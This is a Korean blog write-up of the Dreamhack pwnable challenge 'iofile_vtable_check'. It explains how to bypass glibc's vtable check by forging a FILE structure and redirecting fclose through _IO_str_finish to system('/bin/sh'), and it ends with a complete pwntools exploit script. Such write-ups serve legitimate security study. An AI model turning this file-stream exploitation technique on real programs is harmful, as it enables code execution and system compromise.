---
published: true
image: /img
layout: post
title: "[Dreamhack] PWN iofile_vtable_check"
excerpt: "드림핵 포너블 iofile_vtable_check 문제풀이"
tags: [Dreamhack, pwnable, wargame, writeup]
math: true
date: 2023-03-15 10:00
---

이번 문제는 저번에 올라왔던 iofile_vtable에서 vtable_check 함수가 추가된 ubuntu 18.04 문제다. 이 함수는 _libc_IO_vtables 영역에 vtable이 존재하는지 확인하고 없다면 포인터를 추가로 확인한다. 따라서 iofile_vtable을 통해 익스플로잇 하기 위해서는 _libc_IO_vtables 영역에 있는 익스플로잇터플 한 함수를 사용해야 한다.

우선 소스코드를 먼저 살펴보자.

```c++
// gcc -o vtable_bypass vtable_bypass.c -no-pie 
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <dlfcn.h>

FILE * fp;

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main()
{
    initialize();

    fp = fopen("/dev/urandom", "r");
    printf("stdout: %p\n", stdout);
    printf("Data: ");
    read(0, fp, 300);

    if (*(long*)((char*) fp + 0xe0) != 0)
    {
        exit(0);
    }

    fclose(fp);
}
```

main함수를 보면 fp 값을 dev/urandom 읽기 권한으로 할당한다. 이후 stdout의 주소값을 출력하고 read 함수를 통해 fp에 300자 문자열을 입력 받는다. 이후 입력받은 문자열중 0xe0위치에 있는 8바이트 값이 0이 아니면 exit함수가 동작하고 0이면 fp를 인자로 하여 fclose를 호출하고 코드가 종료한다.


우선 stdout의 주소가 주어지므로 이를 통해 libc base와 system함수, binsh같은 필요한 함수들을 전부 찾아준다.

일단 read함수를 통해서 300자를 받아드릴 수 있어 vtable 위치 이상의 값을 오버라이트 할 수 있다.

이제 vtable을 조작해야 한다. vtable_check 함수가 있어 단순히 메모리 주소를 vtable로 할당하는 방법은 사용하지 못할 것이다. 해당 기법을 우회하기 위해 드림핵 강의를 다시 살펴보자. 드림핵에서는 _IO_str_jumps함수에 있는 _IO_str_overflow를 이용해 공격하는 방법이 설명되어 있다. 

우선 _IO_str_jumps 구조체를 보자
```c++
const struct _IO_jump_t _IO_str_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_str_finish),
  JUMP_INIT(overflow, _IO_str_overflow),
  JUMP_INIT(underflow, _IO_str_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_str_pbackfail),
  JUMP_INIT(xsputn, _IO_default_xsputn),
  JUMP_INIT(xsgetn, _IO_default_xsgetn),
  JUMP_INIT(seekoff, _IO_str_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_default_setbuf),
  JUMP_INIT(sync, _IO_default_sync),
  JUMP_INIT(doallocate, _IO_default_doallocate),
  JUMP_INIT(read, _IO_default_read),
  JUMP_INIT(write, _IO_default_write),
  JUMP_INIT(seek, _IO_default_seek),
  JUMP_INIT(close, _IO_default_close),
  JUMP_INIT(stat, _IO_default_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
```

<br>
이 기법은 다음과 같은 구문을 통해 발생하는 취약점이다.

```c++
new_buf = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
```
_s._allocate_buffer에 들어있는 함수가 (new_size)를 인자로 하여 실행되는 것을 볼 수 있다. _s._allocate_buffer의 위치는 fp로 부터 +0xe0 부분이다. 바이너리 소스코드를 살펴보면 fp+0xe0 부분이 0이 아니면 exit을 실행한다. 해당 부분에 system 함수가 들어가야 하는데 exit이 실행되어 해당 부분을 오버라이트 하는 방법은 힘들어 보인다. 

구글에서 _IO_FILE vtable check bypass에 대해서 검색해 봤다. 일단 총 두가지 방법이 가능했다. 첫번째는 드림핵 강의에 나왔던 _allocate_buffer를 이용해 system을 콜하는 방법이다. 두번째 방법은 _IO_str_jumps의 _IO_str_finish 함수를 이용하는 방법이다.

해당 함수의 소스코드를 살펴보자.

```c++
void _IO_str_finish (_IO_FILE *fp, int dummy)
{
  if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
    (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);
  fp->_IO_buf_base = NULL;

  _IO_default_finish (fp, 0);
}
```

위 코드를 보면 (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base); 구문이 있다 fp의 _IO_buf_base의 값을 인자로 하여 _s._free_buffer에 있는 함수를 실행하게 된다.

위 코드로 익스플로잇을 작성하려면 조건문을 통과 해야한다. fp->_IO_buf_base는 공격에 사용할 인자를 셋팅하기 위해 사용되므로 필히 값이 들어있어야 한다. fp->_IO_buf_base 값과 !(fp->_flags & _IO_USER_BUF)를 &&연산해 참이면 값을 실행한다. _flag의 경우 0으로 설정했고 & 연산에 의해서 () 내부의 값은 0으로 설정되고 ! 구문을 통해 1로 설정된다. 따라서 별도의 설정 없이 _IO_buf_base에 인자를 넣고 _free_buffer에 system 함수 주소를 넣으면 익스플로잇이 가능할 것이다.

그럼 _s._free_buffer는 뭘까? ((_IO_strfile *) fp)->_s._free_buffer 에서 fp는 _IO_strfile 구조로 케스팅 되었고, 변경된 구조에서 _s를 호출했다. _IO_strfile의 구조체는 다음과 같다.

```c++
typedef struct _IO_strfile_
{
  struct _IO_streambuf _sbf;
  struct _IO_str_fields _s;
} _IO_strfile;
```

구조체 안에 _s는 _IO_str_fields로 선언되어 있다. 그럼 이 _IO_str_fields를 살펴보자.

```c++
struct _IO_str_fields
{
  _IO_alloc_type _allocate_buffer;
  _IO_free_type _free_buffer;
};
```
어디서 많이 본 이름이 보인다. 기존 드림핵 강의에서 _IO_str_overflow를 이용한 vtable check bypass 기법을 사용했다. 이때 system 함수가 들어갔던 부분이 _s._allocate_buffer 부분이다. 

우리가 _s._allocate_buffer에 system함수를 오버라이트 할수 없던 이유는 fp의 +0xe0부분이 0인지 검증하는 코드가 있었기 때문이다. 하지만 _IO_str_finish를 이용하게 되면 _allocate_buffer 다음에 있는 _free_buffer 부분에 system 함수 주소가 들어가게 된다. 따라서 0xe0부분엔 0을 그 다음 부분을 system 함수로 준다.

이제 필요한 부분은 다 찾았고 fake vtable을 어떻게 구성할지 고민해 봐야한다.

일단 fake vtable을 통해서 _IO_str_jumps의 IO_str_finish 함수를 실행시켜야 한다. 한가지 다행인 점은 _IO_str_jumps 구조체와 _IO_file_jumps 구조체는 동일하다. 이는 오프셋이 동일한 것을 의미한다. 그리고 _IO_str_jumps 구조체의 위치는 _IO_file_jumps에서 +0xc0에 있다. _IO_str_jumps구조체가 gdb에 찍히지 않아 찾아보니 _IO_file_jumps에서 +0xc0 해주면 된다고 한다.

```c
pwndbg> p &_IO_file_jumps
$11 = (<data variable, no debug info> *) 0x7ff0129e82a0 <_IO_file_jumps>
pwndbg> x/32gx 0x7ff0129e82a0
0x7ff0129e82a0 <_IO_file_jumps>:        0x0000000000000000      0x0000000000000000
0x7ff0129e82b0 <_IO_file_jumps+16>:     0x00007ff01268c330      0x00007ff01268d300
0x7ff0129e82c0 <_IO_file_jumps+32>:     0x00007ff01268d020      0x00007ff01268e3c0
0x7ff0129e82d0 <_IO_file_jumps+48>:     0x00007ff01268fc50      0x00007ff01268b930
0x7ff0129e82e0 <_IO_file_jumps+64>:     0x00007ff01268b590      0x00007ff01268ab90
0x7ff0129e82f0 <_IO_file_jumps+80>:     0x00007ff01268e990      0x00007ff01268a850
0x7ff0129e8300 <_IO_file_jumps+96>:     0x00007ff01268a6d0      0x00007ff01267e100
0x7ff0129e8310 <_IO_file_jumps+112>:    0x00007ff01268b910      0x00007ff01268b190
0x7ff0129e8320 <_IO_file_jumps+128>:    0x00007ff01268a910      0x00007ff01268a840
0x7ff0129e8330 <_IO_file_jumps+144>:    0x00007ff01268b180      0x00007ff01268fdd0
0x7ff0129e8340 <_IO_file_jumps+160>:    0x00007ff01268fde0      0x0000000000000000

pwndbg> x/32gx 0x7ff0129e82a0+0xc0
0x7ff0129e8360: 0x0000000000000000      0x0000000000000000
0x7ff0129e8370: 0x00007ff012690300      0x00007ff01268ff60
0x7ff0129e8380: 0x00007ff01268ff00      0x00007ff01268e3c0
0x7ff0129e8390: 0x00007ff0126902e0      0x00007ff01268e420
0x7ff0129e83a0: 0x00007ff01268e5d0      0x00007ff012690430
0x7ff0129e83b0: 0x00007ff01268e990      0x00007ff01268e860
0x7ff0129e83c0: 0x00007ff01268ec50      0x00007ff01268ea00
0x7ff0129e83d0: 0x00007ff01268fdb0      0x00007ff01268fdc0
0x7ff0129e83e0: 0x00007ff01268fd90      0x00007ff01268ec50
0x7ff0129e83f0: 0x00007ff01268fda0      0x00007ff01268fdd0
0x7ff0129e8400: 0x00007ff01268fde0      0x0000000000000000
```

gdb 상에서는 심볼이 없지만 앞에 16바이트 더미 값이 있고 그 뒤 형식이 동일한 것을 볼 수있다. fclose() 함수를 통해 _IO_str_finish를 실행 시켜야 하므로 _IO_file_jumps에서 +0xc0를 더한 값을 fake vtable로 주었다.

이를 통해 페이로드를 구성하면 다음과 같다.


```python
from pwn import *
context.update(arch='amd64', os='linux')
#context.log_level = 'debug'

#p = remote("host3.dreamhack.games", 10039);
p = process("./iofile_vtable_check", env={'LD_PRELOAD':'./libc.so.6'})
#p = process("./master_canary")
elf = ELF("./iofile_vtable_check")
libc = ELF("./libc.so.6")

p.recvuntil(b"stdout: ")
stdout = int(p.recvuntil(b"\n")[:-1], 16)
libc_base = stdout-libc.sym['_IO_2_1_stdout_']
system = libc_base+libc.sym['system']
fp = elf.sym['fp']
binsh = libc_base+list(libc.search(b"/bin/sh"))[0]
fake_vtable = libc_base + libc.sym['_IO_file_jumps']+0xc0

print(f"stdout : {hex(stdout)}")
print(f"libc_base : {hex(libc_base)}")
print(f"system : {hex(system)}")
print(f"fp : {hex(fp)}")
print(f"binsh : {hex(binsh)}")
print(f"fake vtable : {hex(fake_vtable)}")

pause()

payload = p64(0x0) # flags
payload += p64(0x0) # _IO_read_ptr
payload += p64(0x0) # _IO_read_end
payload += p64(0x0) # _IO_read_base
payload += p64(0x0) # _IO_write_base
payload += p64(0) # _IO_write_ptr
payload += p64(0x0) # _IO_write_end
payload += p64(binsh) # _IO_buf_base
payload += p64(0) # _IO_buf_end
payload += p64(0x0) # _IO_save_base
payload += p64(0x0) # _IO_backup_base
payload += p64(0x0) # _IO_save_end
payload += p64(0x0) # _IO_marker
payload += p64(0x0) # _IO_chain
payload += p64(0x0) # _fileno
payload += p64(0x0) # _old_offset
payload += p64(0x0)
payload += p64(fp + 0x80) # _lock 
payload += p64(0x0)*9
payload += p64(fake_vtable) # io_file_jump overwrite 
payload += p64(0)
payload += p64(system) 

p.sendlineafter(b"Data: ", payload)
p.interactive()
```